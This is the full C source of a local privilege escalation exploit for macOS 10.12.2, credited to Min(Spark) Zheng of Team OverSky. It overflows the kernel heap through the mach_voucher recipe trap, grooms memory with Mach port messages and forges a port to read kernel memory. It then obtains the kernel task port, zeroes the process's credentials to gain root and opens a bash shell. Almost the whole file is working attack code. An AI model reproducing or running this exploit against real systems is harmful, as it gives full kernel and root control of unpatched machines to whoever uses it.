/* ******************************************************************************************
 
 * Local privilege escalation for macOS 10.12.2 via mach_voucher heap overflow
 * by Min(Spark) Zheng @ Team OverSky (twitter@SparkZheng)
 * Special thanks to qwertyoruiop, ian beer, aimin pan, jingle, etc.
 * Reference: 1. Yalu 102: https://github.com/kpwn/yalu102
              2. https://bugs.chromium.org/p/project-zero/issues/detail?id=1004
 
 ***************************************************************************************** */

#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#include <sys/utsname.h>
#include <assert.h>

#define kIOMasterPortDefault MACH_PORT_NULL
#define IO_OBJECT_NULL MACH_PORT_NULL
#define MACH_VOUCHER_ATTR_ATM_CREATE ((mach_voucher_attr_recipe_command_t)510)
#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

#define kr32(address, value)\
*(uint64_t*) (faketask + 0x380) = address - 0x10;\
pid_for_task(foundport, value);

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} sprz;

struct ipc_object {
    natural_t io_bits;
    natural_t io_references;
    char    io_lock_data[0x100];
};

mach_port_t mport = 0;
mach_port_t tfp0 = 0;

void copyin(void* to, uint64_t from, size_t size) {
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000) {
        size = 0x1000;
    }
    size_t off = 0;
    while (1) {
        mach_vm_read_overwrite(tfp0, off+from, size, (mach_vm_offset_t)(off+to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0) {
            break;
        }
        size = szt;
        if (size > 0x1000) {
            size = 0x1000;
        }
        
    }
}

void copyout(uint64_t to, void* from, size_t size) {
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

uint64_t ReadAnywhere64(uint64_t addr) {
    uint64_t val = 0;
    copyin(&val, addr, 8);
    return val;
}

uint64_t WriteAnywhere64(uint64_t addr, uint64_t val) {
    copyout(addr, &val, 8);
    return val;
}

uint32_t ReadAnywhere32(uint64_t addr) {
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
    copyout(addr, &val, 4);
    return val;
}

void unmap(uint64_t addr, uint64_t size) {
    kern_return_t err = mach_vm_deallocate(mach_task_self(), addr, size);
    if (err != KERN_SUCCESS) {
        printf("failed to unmap memory\n");
    }
}

uint64_t map(uint64_t size) {
    uint64_t addr = 0;
    kern_return_t err = mach_vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate mapping: %s\n", mach_error_string(err));
    }
    return addr;
}


uint64_t roundup(uint64_t val, uint64_t pagesize) {
    val += pagesize - 1;
    val &= ~(pagesize - 1);
    return val;
}
mach_port_t get_voucher() {
    mach_voucher_attr_recipe_data_t r = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = MACH_VOUCHER_ATTR_ATM_CREATE
    };
    static mach_port_t p = MACH_PORT_NULL;
    
    if (p != MACH_PORT_NULL) {
        return p;
    }
    
    kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);
    
    if (err != KERN_SUCCESS) {
        printf("failed to create voucher (%s)\n", mach_error_string(err));
    }
    printf("create voucher = 0x%x\n", p);
    
    return p;
}

void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data) {
    
    int pagesize = getpagesize();
    
    void* recipe_size = (void*)map(pagesize);
    
    *(uint64_t*)recipe_size = kalloc_size;
    
    uint64_t actual_copy_size = kalloc_size + overflow_length;
    uint64_t roundupnumber = roundup(actual_copy_size, pagesize);
    uint64_t alloc_size = roundupnumber + pagesize;
    uint64_t base = map(alloc_size);
    uint64_t end = base + roundup(actual_copy_size, pagesize);
    
    unmap(end, pagesize);
    
    uint64_t start = end - actual_copy_size;
    
    uint8_t* recipe = (uint8_t*)start;
    
    memset(recipe, 0x41, kalloc_size);
    memcpy(recipe+kalloc_size, overflow_data, overflow_length);
    
    //trigger the heap overflow!
    kern_return_t err = mach_voucher_extract_attr_recipe_trap( mport, 1, recipe, recipe_size);
}


int main()
{
    printf("*************************************************************************\n");
    printf("Local privilege escalation for macOS 10.12.2 via mach_voucher\n");
    printf("by Min(Spark) Zheng @ Team OverSky (twitter@SparkZheng)\n");
    printf("*************************************************************************\n");
    
    //create mach voucher port
    mport = get_voucher();

    //create fake port
    struct ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    printf("fakeport=0x%p\n",fakeport);
    
    mlock(fakeport, 0x8000);
    
    fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    fakeport->io_lock_data[12] = 0x11;

    mach_port_t* ports = calloc(800, sizeof(mach_port_t));
    
    for (int i = 0; i < 800; i++) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
    }

    sprz msg1;
    memset(&msg1, 0, sizeof(sprz));
    sprz msg2;
    memset(&msg2, 0, sizeof(sprz));
    
    mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
    
    for (int i = 0; i < 0x1000; i++) {
        buffer[i] = MACH_PORT_DEAD;
    }
    
    //init heap fengshui msg
    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.head.msgh_local_port = MACH_PORT_NULL;
    msg1.head.msgh_size = sizeof(msg1)-2048;
    msg1.msgh_body.msgh_descriptor_count = 1;
    msg1.desc[0].address = buffer;
    msg1.desc[0].count = 0x100/8; //32
    msg1.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg1.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    
    // send   1-800
    pthread_yield_np();
    for (int i=1; i<800; i++) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    // recv 300 - 500 i+=4
    pthread_yield_np();
    for (int i = 300; i<500; i+=4) {
        msg2.head.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        if(!(i < 380))
            ports[i] = 0;
        assert(kret==0);
    }

    //send 300 - 380 i+=4
    pthread_yield_np();
    for (int i = 300; i<380; i+=4) {
        msg1.head.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
        assert(kret==0);
    }
    
    //heap overflow here!
    do_overflow(0x100, 8, (uint8_t*)&fakeport);
    
    // 300 - 500 find overflow port
    mach_port_t foundport = 0;
    for (int i=300; i<500; i++) {
        if (ports[i]) {
            msg1.head.msgh_local_port = ports[i];
            pthread_yield_np();
            kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
            assert(kret==0);
            for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
                mach_port_t* ptz = msg1.desc[k].address;
                for (int z = 0; z < 0x100/8; z++) {
                    if (ptz[z] != MACH_PORT_DEAD) {
                        printf("ptz[z]=0x%x\n",ptz[z]);
                        if (ptz[z]) {
                            foundport = ptz[z];
                            goto foundp;
                        }
                        
                    }
                }
            }
            mach_msg_destroy(&msg1.head);
            mach_port_deallocate(mach_task_self(), ports[i]);
            ports[i] = 0;
        }
    }
    printf("can't find overflow port.\n");
    return -1;
    
    // found overflow port
foundp:
    
    printf("found port!\n");
    
    uint64_t textbase = 0xffffff8000200000;
    
    for (int i = 0; i < 0x300; i++) {
        for (int k = 0; k < 0x40000; k+=8) {
            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
            *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
            
            //          fakeport->io_bits = IKOT_CLOCK | IO_BITS_ACTIVE ;
            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
            
            if (kret != KERN_FAILURE) {
                goto gotclock;
            }
        }
    }
    
    printf("can't find clock task.\n");
    return -1;
    
    //found clock task
gotclock:;
    
    fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
    fakeport->io_references = 0xff;
    char* faketask = ((char*)fakeport) + 0x1000;
    
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
    *(uint64_t*) (faketask + 0x10) = 0xee;

    
    uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
    printf("clock task ptr = 0x%llx\n",leaked_ptr);
    leaked_ptr &= ~0x3FFF;

    while (1) {
        int32_t leaked = 0;
        kr32(leaked_ptr, &leaked);
        if (leaked == MH_MAGIC_64) {
            printf("found kernel text at 0x%llx\n", leaked_ptr);
            break;
        }
        leaked_ptr -= 0x4000;
    }
    
    //found kernel base
    uint64_t kernel_base = leaked_ptr;

    
    //0xFFFFFF8000ABC490 _allproc
    //0xFFFFFF8000200000 kernel text base
    uint64_t allproc_offset = 0x8bc490;
    
    uint64_t allproc = allproc_offset + kernel_base;
    
    uint64_t proc_ = allproc;
    
    uint64_t myproc = 0;
    uint64_t kernproc = 0;
    
    //find kernel proc
    while (proc_) {
        uint64_t proc = 0;
        
        kr32(proc_, (int32_t*)&proc);
        kr32(proc_+4, (int32_t*)(((uint64_t)(&proc)) + 4));
        
        int pd = 0;
        
        kr32(proc+0x10, (int32_t*)&pd);
        
        if (pd == getpid()) {
            myproc = proc;
        } else if (pd == 0){
            kernproc = proc;
        }
        proc_ = proc;
    }
    
    
    uint64_t kern_task = 0;
    kr32(kernproc+0x18, (int32_t*)&kern_task);
    kr32(kernproc+0x18+4 , (int32_t*)(((uint64_t)(&kern_task)) + 4));
    
    uint64_t itk_kern_sself = 0;
    kr32(kern_task+0xe8, (int32_t*)&itk_kern_sself);
    kr32(kern_task+0xe8+4 , (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
    
    char* faketaskport = malloc(0x1000);
    char* ktaskdump = malloc(0x1000);
    
    for (int i = 0; i < 0x1000/4; i++) {
        kr32(itk_kern_sself+i*4, (int32_t*)(&faketaskport[i*4]));
    }
    
    for (int i = 0; i < 0x1000/4; i++) {
        kr32(kern_task+i*4, (int32_t*)(&ktaskdump[i*4]));
    }
    
    //dump kernel task port
    memcpy(fakeport, faketaskport, 0x1000);
    memcpy(faketask, ktaskdump, 0x1000);
    
    
    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
    
    *(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;
    
    //get kernel task
    task_get_special_port(foundport, 4, &tfp0);
    printf("tfp0 = 0x%x\n", tfp0);
    
    fakeport->io_bits = 0;
    
    uint64_t slide;
    slide = kernel_base - 0xFFFFFF8000200000;
    
    printf("kernel_base=0x%llx slide=0x%llx header=0x%llx\n",kernel_base, slide,ReadAnywhere64(kernel_base));

    //get root
    uint64_t cred = ReadAnywhere64(myproc+0xe8);
    WriteAnywhere64(cred+0x18,0);

    printf("getuid = %d\n", getuid());
    
    //get shell
    system("/bin/bash");
    
    return 0;
}

